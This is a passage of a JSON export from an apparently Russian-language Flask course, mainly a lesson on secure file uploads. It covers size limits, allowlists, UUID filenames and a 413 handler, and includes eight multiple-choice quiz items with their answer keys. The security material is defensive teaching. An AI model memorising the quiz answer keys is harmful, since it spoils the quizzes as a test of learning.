&lt;/li&gt;\r\n      &lt;/ul&gt;\r\n    &lt;/div&gt;\r\n  &lt;/div&gt;\r\n&lt;/nav&gt;</code></pre><p>Многочисленные атрибуты в тэге &lt;button&gt; относятся к css-фреймворку Bootstrap.</p><p>&nbsp;</p><p>Также в шаблоне base.html замените код блока <span style=\"font-family:&quot;Courier New&quot;;\">&lt;div class=\"container\"&gt;</span> :</p><pre><code class=\"language-jinja2\">&lt;div class=\"container\"&gt;\r\n  {% for message in get_flashed_messages() %}\r\n    &lt;div class=\"alert alert-danger\"&gt;{{ message }}&lt;/div&gt;\r\n  {% endfor %}\r\n  {% block content %} {% endblock %}\r\n&lt;/div&gt;</code></pre><p>Т.е. в блоке &lt;div class=\"container\"&gt; непосредственно перед блоком content добавьте цикл for, необходимый для отображения всплывающих сообщений под панелью навигации. Всплывающие сообщения доступны в специальной функции Flask <span style=\"font-family:&quot;Courier New&quot;;\">get_flashed_messages()</span>.<br>Сохраните и закройте файл base.html.</p><p>&nbsp;</p><p>7. Откройте главную страницу. На панели навигации появилась гиперссылка \"Новый пост\", связанная с маршрутом /create. Убедитесь, что по ссылке \"Новый пост\" можно перейти на страницу создании нового поста и создайте пару новых постов. Попробуйте \"забыть\" написать текст в поле 'Title'.</p><p>Также протестируйте адаптивность сайта и работу кнопку открытия меню на узких ширинах окна браузера.</p><p>&nbsp;</p><p><strong>Итоговые замечания.</strong></p><p>Приложение сознательно упрощено, особенно в части безопасности.</p><p>В реальном приложении должно быть:</p><p>CSRF-защита</p><p>XSS-защита</p><p>Экранирования HTML-ввода</p><p>Функция autoescape</p><p>Конфигурация должна выносится в отдельный файлы</p><p>Вместо прямого взаимодействия с базой данных и SQL-запросов должна использоваться ORM (SQLAlchemy).</p><p>Вместо прямой работы с формами лучше использовать Flask-WTF и WTForms</p><p>&nbsp;</p>"
            },
            "is_published": true
        },
        {
            "id": 11,
            "section_id": 1,
            "number": 8,
            "name": "Загрузка файлов на сервер во Flask",
            "slug": "files-loading",
            "content": {
                "tasks": [
                    {
                        "id": 1,
                        "content": "<p><span style=\"color:black;\">Сделайте страницу со списком загруженных файлов.</span></p><p><span style=\"color:black;\">Сделайте так, чтобы при каждой загрузке файла, осуществлялся переход на эту страницу</span></p>"
                    }
                ],
                "tests": [
                    {
                        "id": 1,
                        "options": [
                            "method=\"get\"",
                            "enctype=\"application/json\"",
                            "enctype=\"multipart/form-data\" ",
                            "accept=\"file\""
                        ],
                        "question": "Какой атрибут обязательно должен быть у HTML-формы для загрузки файлов во Flask?",
                        "correct_index": 2
                    },
                    {
                        "id": 2,
                        "options": [
                            "form.files",
                            "request.data",
                            "request.files ",
                            "flask.files"
                        ],
                        "question": "Из какого объекта Flask извлекаются загруженные файлы?",
                        "correct_index": 2
                    },
                    {
                        "id": 3,
                        "options": [
                            "В папке templates",
                            "В папке static",
                            "В директории instance/uploads ",
                            "В корне проекта рядом с app.py"
                        ],
                        "question": "Где рекомендуется хранить загруженные файлы во Flask-приложении?",
                        "correct_index": 2
                    },
                    {
                        "id": 4,
                        "options": [
                            "Для работы send_from_directory",
                            "Для генерации UUID",
                            "Для ограничения размера файла",
                            "Для работы flash, сессий и загрузки файлов "
                        ],
                        "question": "Зачем задаётся app.secret_key при загрузке файлов?",
                        "correct_index": 3
                    },
                    {
                        "id": 5,
                        "options": [
                            "Для генерации UUID",
                            "Для проверки MIME-типа",
                            "Для очистки имени файла от опасных символов и путей ",
                            "Для сохранения файла на диск"
                        ],
                        "question": "Для чего используется функция secure_filename()?",
                        "correct_index": 2
                    },
                    {
                        "id": 6,
                        "options": [
                            "Чтобы ускорить загрузку",
                            "Чтобы избежать перезаписи файлов и угадываемых URL ",
                            "Чтобы сохранить оригинальное имя",
                            "Чтобы определить MIME-тип"
                        ],
                        "question": "Зачем генерировать уникальное имя файла (UUID)?",
                        "correct_index": 1
                    },
                    {
                        "id": 7,
                        "options": [
                            "download=True",
                            "safe=True",
                            "as_attachment=True ",
                            "secure=True"
                        ],
                        "question": "Какой параметр send_from_directory защищает от XSS-атак?",
                        "correct_index": 2
                    },
                    {
                        "id": 8,
                        "options": [
                            "400",
                            "404",
                            "413 ",
                            "500"
                        ],
                        "question": "Какой HTTP-код ошибки возникает при превышении MAX_CONTENT_LENGTH?",
                        "correct_index": 2
                    }
                ],
                "theory_html": "<h4>Введение</h4><p><span style=\"color:black;\">Загрузка файлов — одна из самых чувствительных к безопасности частей web-приложения.</span></p><p><span style=\"color:black;\">Ошибки здесь могут привести к:</span></p><p><span style=\"color:black;\">- выполнению вредоносного кода,</span></p><p><span style=\"color:black;\">- утечке данных,</span></p><p><span style=\"color:black;\">- перезаписи системных файлов,</span></p><p><span style=\"color:black;\">- XSS-атакам,</span></p><p><span style=\"color:black;\">- переполнению диска сервера.</span></p><p><span style=\"color:black;\">Поэтому даже в учебных проектах важно сразу формировать правильный подход.</span><br><span style=\"color:black;\">(что такое XSS - разберём в следующей лекции с примерами)</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">Базовая схема загрузки файлов во Flask:</span></p><p><span style=\"color:black;\">- HTML-форма должна использовать</span></p><p><span style=\"color:black;\">enctype=\"multipart/form-data\"</span></p><p><span style=\"color:black;\">- Файл извлекается из request.files</span></p><p><span style=\"color:black;\">- Файл валидируется</span></p><p><span style=\"color:black;\">- Файл сохраняется под безопасным уникальным именем</span></p><p><span style=\"color:black;\">- Файл не хранится в директории приложения</span></p><p><span style=\"color:black;\">- Отдельно обрабатываются ошибки (в том числе 413)</span></p><p><span style=\"color:black;\">&nbsp;</span></p><h4>Структура проекта</h4><p><span style=\"color:black;\">(для данной лекции, без учёта уже имеющихся файлов созданных в предыдущих лекциях)</span></p><pre><code class=\"language-python\">project/\r\n│\r\n├── app.py\r\n├── templates/\r\n│&nbsp;&nbsp; └── upload.html\r\n│\r\n└── instance/\r\n &nbsp;&nbsp; └── uploads/</code></pre><p><span style=\"color:black;\">Важно:</span></p><p><span style=\"color:black;\">Директория instance/ не является частью приложения и не должна попадать под контроль версий git или подобное.</span></p><p><span style=\"color:black;\">Это рекомендуемая Flask-практика для хранения:</span></p><p><span style=\"color:black;\">- загруженных файлов</span></p><p><span style=\"color:black;\">- конфигурации</span></p><p><span style=\"color:black;\">- секретов</span></p><p><span style=\"color:black;\">&nbsp;</span></p><h4>Подготовка приложения</h4><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">1. Импорты и конфигурация.</span></p><p><span style=\"color:black;\">Замените код импортов в начале файла app.py на следующий:</span></p><pre><code class=\"language-python\">from flask import (\r\n &nbsp;&nbsp; Flask, request, redirect, url_for,\r\n &nbsp;&nbsp; render_template, flash, send_from_directory\r\n)\r\nfrom werkzeug.utils import secure_filename\r\nfrom werkzeug.exceptions import RequestEntityTooLarge\r\nimport os\r\nimport uuid\r\nimport mimetypes</code></pre><p><span style=\"color:black;\">Все импорты имеющие отношение к самому Flask мы объединили в одну группу.</span></p><p><span style=\"color:black;\">Большая часть импортируемых компонентов нам знакома.</span></p><p><span style=\"color:black;\">send_from_directory - послать из каталога.</span></p><p><span style=\"color:black;\">Про werkzeug объясним ниже.</span></p><p><span style=\"color:black;\">Остальные импорты относятся к самому Python.</span></p><p><span style=\"color:black;\">os - библиотека для работы с операционной системой и файловой системой сервера, нужно для создания, записи и сохранения файлов.</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">Далее, без объяснений и комментариев напишем код работающего приложения по загрузке файлов и протестируем его.</span></p><p><span style=\"color:black;\">Все объяснения каждой строки кода выведем отдельным блоком ниже.</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">2. Создание приложения и секретный ключ</span></p><pre><code class=\"language-python\">app = Flask(__name__)\r\n \r\napp.secret_key = \"dev-secret-key\"</code></pre><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">3. Создание директории загрузки (вне приложения).</span></p><p><span style=\"color:black;\">Добавьте следующий код ниже кода секретного ключа:</span></p><pre><code class=\"language-python\">UPLOAD_FOLDER = os.path.join(\r\n &nbsp;&nbsp; app.instance_path, \"uploads\"\r\n)\r\nos.makedirs(UPLOAD_FOLDER, exist_ok=True)\r\napp.config[\"UPLOAD_FOLDER\"] = UPLOAD_FOLDER</code></pre><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">4. Ограничение размера файла, допустимых расширений и MIME-типов.</span></p><pre><code class=\"language-python\">app.config[\"MAX_CONTENT_LENGTH\"] = 16 * 1024 * 1024&nbsp; # 16 MB\r\nALLOWED_EXTENSIONS = {\"png\", \"jpg\", \"jpeg\", \"pdf\", \"txt\"}\r\nALLOWED_MIME_TYPES = {\r\n &nbsp;&nbsp; \"image/png\",\r\n &nbsp;&nbsp; \"image/jpeg\",\r\n &nbsp;&nbsp; \"application/pdf\",\r\n &nbsp;&nbsp; \"text/plain\"\r\n}</code></pre><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">5. Ниже напишите функцию проверки файла:</span></p><pre><code class=\"language-python\">def allowed_file(filename, mimetype):\r\n &nbsp;&nbsp; if \".\" not in filename:\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return False\r\n &nbsp;&nbsp; ext = filename.rsplit(\".\", 1)[1].lower()\r\n &nbsp;&nbsp; return (\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ext in ALLOWED_EXTENSIONS and\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mimetype in ALLOWED_MIME_TYPES\r\n &nbsp;&nbsp; )</code></pre><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">6. Ниже напишите функцию генерации безопасного уникального имени</span></p><pre><code class=\"language-python\">def generate_filename(original_filename):\r\n &nbsp;&nbsp; ext = original_filename.rsplit(\".\", 1)[1].lower()\r\n &nbsp;&nbsp; return f\"{uuid.uuid4().hex}.{ext}\"</code></pre><p><span style=\"color:black;\">&nbsp;Никогда не сохраняйте файл под оригинальным именем</span></p><p><span style=\"color:black;\"><code>original_name = file.filename</code></span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">7. Маршрут загрузки файла</span></p><pre><code class=\"language-python\">@app.route(\"/upload/\", methods=[\"GET\", \"POST\"])\r\ndef upload():\r\n &nbsp;&nbsp; if request.method == \"POST\":\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if \"file\" not in request.files:\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; flash(\"Файл не найден в запросе\")\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return redirect(request.url)\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; file = request.files[\"file\"]\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if file.filename == \"\":\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; flash(\"Файл не выбран\")\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return redirect(request.url)\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if not allowed_file(file.filename, file.mimetype):\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; flash(\"Недопустимый тип файла\")\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return redirect(request.url)\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; safe_name = generate_filename(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; secure_filename(file.filename)\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )\r\n \r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; file.save(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; os.path.join(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; app.config[\"UPLOAD_FOLDER\"],\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; safe_name\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )\r\n \r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; flash(\"Файл успешно загружен\")\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return redirect(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; url_for(\"download_file\", name=safe_name)\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )\r\n \r\n &nbsp;&nbsp; return render_template(\"upload.html\")</code></pre><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">8. Маршрут просмотра (скачивания) файла</span></p><pre><code class=\"language-python\">@app.route(\"/download/&lt;name&gt;\")\r\ndef download_file(name):\r\n &nbsp;&nbsp; return send_from_directory(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; app.config[\"UPLOAD_FOLDER\"],\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; name,\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; as_attachment=True\r\n &nbsp;&nbsp; )</code></pre><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">9. HTML-шаблон.</span></p><p><span style=\"color:black;\">В каталоге templates создайте страницу с формой загрузки файлов upload.html :</span></p><pre><code class=\"language-jinja2\">{% extends 'base.html' %}\r\n \r\n{% block content %}\r\n&lt;h1&gt;Загрузка файла&lt;/h1&gt;\r\n \r\n{% with messages = get_flashed_messages() %}\r\n &nbsp;{% if messages %}\r\n &nbsp;&nbsp;&nbsp;&lt;ul&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{% for msg in messages %}\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;{{ msg }}&lt;/li&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{% endfor %}\r\n &nbsp;&nbsp;&nbsp;&lt;/ul&gt;\r\n &nbsp;{% endif %}\r\n{% endwith %}\r\n \r\n&lt;form method=\"post\" enctype=\"multipart/form-data\"&gt;\r\n &nbsp;&lt;input type=\"file\" name=\"file\"&gt;\r\n &nbsp;&lt;button type=\"submit\"&gt;Загрузить&lt;/button&gt;\r\n&lt;/form&gt;\r\n \r\n{% endblock %}</code></pre><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">10. В base.html создайте ссылку на страницу загрузки файлов</span></p><p><span style=\"color:black;\"><code>&lt;li&gt;&lt;a href=\"{{ url_for('upload') }}\"&gt;Загрузка файлов&lt;/a&gt;&lt;/li&gt;</code></span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">11. Запустите приложение.</span></p><p><span style=\"color:black;\">На рабочем столе, создайте какой ни будь текстовый файл, например text.txt, с каким ни будь содержимым.</span></p><p><span style=\"color:black;\">Перейдите на страницу (маршрут) загрузки файлов.</span></p><p><span style=\"color:black;\">Воспользовавшись стандартным элементом / диалоговым окном загрузки - выберите файл, и кнопкой Загрузить - загрузите файл.</span></p><p><span style=\"color:black;\">Файл должен появится в директории instance/uploads вашего приложения.</span></p><p><span style=\"color:black;\">Поскольку в нашем, учебном случае, сервером и клиентом является один и тот же компьютер, файл выбирается в одном месте и загружается в другое место.</span></p><p><span style=\"color:black;\">В реальности, клиентом будет удалённый компьютер и браузер посетителя нашего web-приложения.</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">12. Обработка ошибки 413 (слишком большой файл).</span></p><p><span style=\"color:black;\">Добавьте ниже маршрута просмотра (скачивания) файла следующий код обработчика ошибки:</span></p><pre><code class=\"language-python\">@app.errorhandler(RequestEntityTooLarge)\r\ndef handle_file_too_large(e):\r\n &nbsp;&nbsp; return \"Файл слишком большой\", 413</code></pre><p><span style=\"color:black;\">&nbsp;Запустите приложение и протестируйте, попытавшись загрузить файл больше 16 Mb.</span></p><p><span style=\"color:black;\">(но не сильно большой, не больше 100 Mb, а то приложение будет \"долго думать\")</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">Таким образом, мы создали полностью рабочее и функциональное приложение по загрузке файлов, чтобы предоставить функционал клиентам нашего приложения загружать файлы с их компьютера в папку на нашем сервере.</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\"><strong>Теперь давайте ещё раз выведем весь значимый код подряд с объяснением кода:</strong></span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\"><strong>2. Создание приложения и секретный ключ</strong></span></p><p><span style=\"color:black;\"><code>app.secret_key = \"dev-secret-key\"</code></span></p><p><span style=\"color:black;\">Объяснение:</span></p><p><span style=\"color:black;\">secret_key обязателен, если используются:</span></p><p><span style=\"color:black;\">- flash()</span></p><p><span style=\"color:black;\">- сессии (session)</span></p><p><span style=\"color:black;\">- CSRF-защита (Flask-WTF)</span></p><p><span style=\"color:black;\">- загрузка файлов</span></p><p><span style=\"color:black;\">В учебных проектах допустимо задавать ключ прямо в коде.</span></p><p><span style=\"color:black;\">В реальных (production) проектах:</span></p><p><span style=\"color:black;\">- ключ никогда не хранят в коде</span></p><p><span style=\"color:black;\">- он задаётся через переменные окружения или конфигурационные файлы</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p>&nbsp;</p><p><span style=\"color:black;\"><strong>3. Создание директории загрузки (вне приложения)</strong></span></p><pre><code class=\"language-python\">UPLOAD_FOLDER = os.path.join(\r\n &nbsp;&nbsp;&nbsp;app.instance_path, \"uploads\"\r\n)\r\nos.makedirs(UPLOAD_FOLDER, exist_ok=True)\r\napp.config[\"UPLOAD_FOLDER\"] = UPLOAD_FOLDER</code></pre><p><span style=\"color:black;\">Объяснение:</span></p><p><span style=\"color:black;\">app.instance_path - указатель на папку instance - это специальная директория Flask, предназначенная для:</span></p><p><span style=\"color:black;\">- пользовательских данных</span></p><p><span style=\"color:black;\">- загруженных файлов</span></p><p><span style=\"color:black;\">- конфигураций</span></p><p><span style=\"color:black;\">- секретов</span></p><p><span style=\"color:black;\">Важно:</span></p><p><span style=\"color:black;\">- эта папка не является частью приложения</span></p><p><span style=\"color:black;\">- создаётся автоматически</span></p><p><span style=\"color:black;\">- она не предназначена для публикации</span></p><p><span style=\"color:black;\">- не лежит рядом с кодом</span></p><p><span style=\"color:black;\">- не доступна напрямую через web-сервер</span></p><p><span style=\"color:black;\">- по умолчанию не попадает под контроль версий (git)</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\"><code>os.path.join(app.instance_path, \"uploads\")</code></span></p><p><span style=\"color:black;\">безопасно соединяет путь:</span></p><p><span style=\"color:black;\">базовую папку instance</span></p><p><span style=\"color:black;\">подкаталог uploads</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\"><code>os.makedirs(UPLOAD_FOLDER, exist_ok=True)</code></span></p><p><span style=\"color:black;\">создаёт папку uploads</span></p><p><span style=\"color:black;\">если папка уже существует — ошибки не будет</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\"><code>app.config[\"UPLOAD_FOLDER\"] = UPLOAD_FOLDER</code></span></p><p><span style=\"color:black;\">сохраняет путь в конфигурации Flask-приложения</span></p><p><span style=\"color:black;\">делает его доступным из любого места кода.</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">Этот код создаёт папку для загруженных файлов <strong>в безопасном месте,</strong> гарантирует, что она существует, и сохраняет путь к ней в конфигурации приложения.</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\"><strong>4. Ограничение размера файла, допустимых расширений и MIME-типов</strong></span></p><pre><code class=\"language-jinja2\">app.config[\"MAX_CONTENT_LENGTH\"] = 16 * 1024 * 1024  # 16 MB\r\nALLOWED_EXTENSIONS = {\"png\", \"jpg\", \"jpeg\", \"pdf\", \"txt\"}\r\nALLOWED_MIME_TYPES = {\r\n &nbsp;&nbsp;&nbsp;\"image/png\",\r\n &nbsp;&nbsp;&nbsp;\"image/jpeg\",\r\n &nbsp;&nbsp;&nbsp;\"application/pdf\",\r\n &nbsp;&nbsp;&nbsp;\"text/plain\"\r\n}</code></pre><p><span style=\"color:black;\">Объяснение:</span></p><p><span style=\"color:black;\">ALLOWED - разрешённый.</span></p><p><span style=\"color:black;\">Записываем в конфиг приложения максимальный разрешённый размер файла</span></p><p><span style=\"color:black;\">16 * 1024 * 1024 - стандартная в таких случаях запись.</span></p><p><span style=\"color:black;\">Первый 1024 - килобайты, второй 1024 - мегабайты.</span></p><p><span style=\"color:black;\">Про разрешённые расширения файлов ALLOWED_EXTENSIONS - всё понятно.</span></p><p><span style=\"color:black;\">Про MIME-типы почитайте самостоятельно.</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\"><strong>5. Функция проверки файла</strong></span></p><pre><code class=\"language-python\">def allowed_file(filename, mimetype):\r\n &nbsp;&nbsp;&nbsp;if \".\" not in filename:\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return False\r\n &nbsp;&nbsp;&nbsp;ext = filename.rsplit(\".\", 1)[1].lower()\r\n &nbsp;&nbsp;&nbsp;return (\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ext in ALLOWED_EXTENSIONS and\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mimetype in ALLOWED_MIME_TYPES\r\n &nbsp;&nbsp;&nbsp;)</code></pre><p><span style=\"color:black;\">Объяснение:</span></p><p><span style=\"color:black;\">Назначение функции allowed_file</span></p><p><span style=\"color:black;\">def allowed_file(filename, mimetype)</span></p><p><span style=\"color:black;\">Функция отвечает на вопрос: разрешено ли загружать данный файл?</span></p><p><span style=\"color:black;\">Она проверяет два независимых признака:</span></p><p><span style=\"color:black;\">Расширение файла</span></p><p><span style=\"color:black;\">MIME-тип файла</span></p><p><span style=\"color:black;\">Файл считается допустимым, только если ОБЕ проверки проходят.</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">5.1. Проверка наличия расширения</span></p><p><span style=\"color:black;\"><code>if \".\" not in filename:</code></span></p><p><span style=\"color:black;\"><code>&nbsp;&nbsp;&nbsp; return False</code></span></p><p><span style=\"color:black;\">Проверяется, есть ли в имени файла точка .</span></p><p><span style=\"color:black;\">Если точки нет — расширения нет</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">5.2. Извлечение расширения файла</span></p><p><span style=\"color:black;\"><code>ext = filename.rsplit(\".\", 1)[1].lower()</code></span></p><p><span style=\"color:black;\">rsplit(\".\", 1) → разбивает строку справа, максимум на 2 части</span></p><p><span style=\"color:black;\">[1] — берём часть после последней точки</span></p><p><span style=\"color:black;\">.lower() — приводим к нижнему регистру</span></p><p><span style=\"color:black;\">PNG, Png, png → все станут png</span></p><p><span style=\"color:black;\">исключает ошибки из-за регистра</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">5.3. Проверка расширения</span></p><p><span style=\"color:black;\"><code>ext in ALLOWED_EXTENSIONS</code></span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">5.4. Проверка MIME-типа</span></p><p><span style=\"color:black;\"><code>mimetype in ALLOWED_MIME_TYPES</code></span></p><p><span style=\"color:black;\">Зачем проверять MIME-тип</span></p><p><span style=\"color:black;\">Потому что расширение можно подделать:</span></p><p><span style=\"color:black;\">virus.exe → virus.jpg</span></p><p><span style=\"color:black;\">Но MIME-тип часто выдаёт реальное содержимое.</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">5.5. Итоговое логическое условие</span></p><pre><code class=\"language-python\">return (\r\n &nbsp;&nbsp; ext in ALLOWED_EXTENSIONS and\r\n &nbsp;&nbsp; mimetype in ALLOWED_MIME_TYPES\r\n)</code></pre><p><span style=\"color:black;\">Файл разрешён только если одновременно:</span></p><p><span style=\"color:black;\">расширение допустимо</span></p><p><span style=\"color:black;\">MIME-тип допустим</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">Важное уточнение:</span></p><p><span style=\"color:black;\">file.mimetype приходит от клиента (браузера)</span></p><p><span style=\"color:black;\">Это не 100% защита, но:</span></p><p><span style=\"color:black;\">для учебных проектов — отлично</span></p><p><span style=\"color:black;\">для продакшена можно дополнительно:</span></p><p><span style=\"color:black;\">анализировать содержимое файла</span></p><p><span style=\"color:black;\">использовать python-magic</span></p><p><span style=\"color:black;\">проверять сигнатуры файлов</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">Вывод:</span></p><p><span style=\"color:black;\">Никогда не доверяй только имени файла.</span></p><p><span style=\"color:black;\">Проверяй:</span></p><p><span style=\"color:black;\">есть ли расширение</span></p><p><span style=\"color:black;\">входит ли расширение в белый список</span></p><p><span style=\"color:black;\">совпадает ли MIME-тип</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\"><strong>6. Функция генерации безопасного уникального имени</strong></span></p><pre><code class=\"language-python\">def generate_filename(original_filename):\r\n &nbsp;&nbsp;&nbsp;ext = original_filename.rsplit(\".\", 1)[1].lower()\r\n &nbsp;&nbsp;&nbsp;return f\"{uuid.uuid4().hex}.{ext}\"</code></pre><p><span style=\"color:black;\">Объяснение:</span></p><p><span style=\"color:black;\">Функция генерирует безопасное уникальное имя файла, сохраняя оригинальное расширение.</span></p><p><span style=\"color:black;\">Зачем это нужно:</span></p><p><span style=\"color:black;\">- чтобы файлы не перезаписывали друг друга</span></p><p><span style=\"color:black;\">- чтобы скрыть оригинальное имя (безопасность)</span></p><p><span style=\"color:black;\">- чтобы избежать проблем с пробелами, кириллицей, спецсимволами</span></p><p><span style=\"color:black;\">- чтобы усложнить угадывание URL файлов</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">1. Получение расширения файла</span></p><p><span style=\"color:black;\"><code>ext = original_filename.rsplit(\".\", 1)[1].lower()</code></span></p><p><span style=\"color:black;\">Что здесь происходит:</span></p><p><span style=\"color:black;\">rsplit(\".\", 1) - разбивает строку справа налево, максимум 1 раз.</span></p><p><span style=\"color:black;\">Это важно, потому что:</span></p><p><span style=\"color:black;\">- имя файла может содержать несколько точек</span></p><p><span style=\"color:black;\">- расширение всегда берётся последнее</span></p><p><span style=\"color:black;\">[1] - Берём второй элемент списка — это расширение.</span></p><p><span style=\"color:black;\">.lower() - приводим расширение к нижнему регистру:</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">2. Генерация уникального имени</span></p><p><span style=\"color:black;\"><code>uuid.uuid4().hex</code></span></p><p><span style=\"color:black;\">uuid4() — случайный уникальный идентификатор</span></p><p><span style=\"color:black;\">hex — строка из 32 шестнадцатеричных символов</span></p><p><span style=\"color:black;\">Пример:</span></p><p><span style=\"color:black;\"><code>9f3c6a3e1a4e4bdfb7d9b7a8c1e2a4f6</code></span></p><p><span style=\"color:black;\">- вероятность совпадения практически нулевая</span></p><p><span style=\"color:black;\">- не содержит опасных символов</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">3. Формирование итогового имени</span></p><p><span style=\"color:black;\"><code>return f\"{uuid.uuid4().hex}.{ext}\"</code></span></p><p><span style=\"color:black;\">Соединяем:</span></p><p><span style=\"color:black;\"><code>&lt;уникальный_id&gt;.&lt;расширение&gt;</code></span></p><p><span style=\"color:black;\">Пример результата:</span></p><p><span style=\"color:black;\"><code>e4b1c2a9f8a74e2a9d5c8b7e4a1f9c3d.jpg</code></span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">Почему нельзя сохранять оригинальное имя файла</span></p><p><span style=\"color:black;\">- перезапись файлов</span></p><p><span style=\"color:black;\">- XSS</span></p><p><span style=\"color:black;\">- path traversal</span></p><p><span style=\"color:black;\">- спецсимволы</span></p><p><span style=\"color:black;\">- кириллица</span></p><p><span style=\"color:black;\">- угадываемые URL</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\"><strong>7. Маршрут загрузки файла</strong></span></p><pre><code class=\"language-python\">@app.route(\"/upload/\", methods=[\"GET\", \"POST\"])\r\ndef upload():\r\n &nbsp;&nbsp;&nbsp;if request.method == \"POST\":\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if \"file\" not in request.files:\r\n 